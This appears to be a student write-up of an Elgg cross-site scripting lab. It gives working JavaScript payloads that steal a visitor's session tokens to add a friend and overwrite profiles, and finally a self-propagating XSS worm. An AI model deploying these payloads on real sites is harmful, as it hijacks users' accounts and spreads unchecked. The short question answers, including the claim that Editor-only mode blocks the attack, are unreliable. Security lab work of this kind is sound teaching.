
## Task 4: Becoming the Victim’s Friend
```JavaScript
<script type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
         // (1)
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
         // (2)
        //Construct the HTTP request to add Samy as a friend.
        var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token; //FILL IN
        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```
1. Explain the purpose of Lines (1) and (2), why are they are needed?
    They are needed to prove the user is authorized
2. If the Elgg application only provide the Editor mode for the “About Me” field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?
    No, you cannot launch a successful attack this way

## Task 5: Modifying the Victim’s Profile
The objective of this task is to modify the victim’s profile when the victim visits Samy’s page. Specifically, modify the victim’s “About Me” field. We will write an XSS worm to complete the task. This worm does not self-propagate; in task 6, we will make it self-propagating.

```JavaScript
<script type="text/javascript">
    window.onload = function() {
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        var userName="&name="+elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var description="&description=<p>Samy is my hero</p>";
        //Construct the content of your url.
        var content=token+ts+userName+description+guid; //FILL IN
        var samyGuid="59"; //FILL IN
        var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
        if(elgg.session.user.guid != samyGuid) { //1
        //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>
```

1. Why do we need Line (1)? Remove this line, and repeat your attack. Report and explain your observation.
    If we do not use Line (1), Samy's description will be overridden and the script will no longer be in the attackers page.

## Task 6: Writing a Self-Propagating XSS Worm
To become a real worm, the malicious JavaScript program should be able to propagate itself. Namely,whenever some people view an infected profile, not only will their profiles be modified, the worm will also be propagated to their profiles, further affecting others who view these newly infected profiles. This way, the more people view the infected profiles, the faster the worm can propagate.

```JavaScript
<script id="worm" type="text/javascript">
    window.onload = function() {
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; // (1)
        var jsCode = document.getElementById("worm").innerHTML; // (2)
        var tailTag = "</" + "script>"; // (3)
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); // (4)
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        var userName="&name="+elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var description="&description="+wormCode+"<p>Samy is my hero</p>";
        //Construct the content of your url.
        var content=token+ts+userName+description+guid; //FILL IN
        var samyGuid="59"; //FILL IN
        var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
        if(elgg.session.user.guid != samyGuid) { //1
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(content);
        }

    }
</script>
```
